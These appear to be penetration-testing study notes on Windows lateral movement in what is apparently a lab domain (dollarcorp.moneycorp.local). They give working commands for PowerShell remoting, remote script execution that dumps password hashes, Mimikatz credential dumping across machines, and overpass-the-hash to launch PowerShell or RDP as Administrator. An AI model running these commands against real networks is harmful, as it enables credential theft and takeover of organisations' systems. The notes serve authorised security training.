# Lateral Movement

## To Enable Powershell Remoting(Requires Admin)

```
Enable-PSRemoting -Force
```

uses 5985 - http and 5986 for ssl\
needs local admin rights on target machine

## Powershell Remoting

you can use -Credential parameter to pass credentials

```
Enter-PSSession -ComputerName dcorp-adminsrv.dollarcorp.moneycorp.local
```

## StateFull Sessions

## Invoke-Command

Use below to execute commands or scriptblocks:&#x20;

• Use below to execute scripts from files\
Invoke-Command –FilePath C:\Get-PassHashes.ps1 - ComputerName (Get-Content list\_of\_servers)

if it shows constraint language mode you can only run built-in functions which is caused by applocker policy\
you can import scripts in you machine and then call the function through invoke-command

Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections

## Use below to execute locally loaded function on the remote machines

• In this case, we are passing Arguments. Keep in mind that only positional arguments could be passed this way:\
Invoke-Command -ScriptBlock ${function:Get-PassHashes} - ComputerName (Get-Content list\_of\_servers) - ArgumentList

In below, a function call within the script is used\
Invoke-Command –Filepath C:\Get-PassHashes.ps1 - ComputerName (Get-Content list\_of\_servers)

## Use below to execute "Stateful" commands using Invoke-Command:

```
$Sess = New-PSSession –Computername Server1
Invoke-Command –Session $Sess –ScriptBlock {$Proc = Get-Process}
Invoke-Command –Session $Sess –ScriptBlock {$Proc.Name}
```

## Mimikatz

```
Import-Module .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -DumpCreds

Invoke-Mimikatz -DumpCreds -ComputerName @("sys1","sys2") //dumping on multiple remote machines

"over pass the hash" generate tokens from hashes.
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:powershell.exe"'

```



## RDP with NTLM

```
Invoke-Mimikatz -Command '"sekurlsa::pth /user:Administrator /domain:dollarcorp.moneycorp.local /ntlm:<ntlmhash> /run:mstsc.exe restrictedadmin"'
```

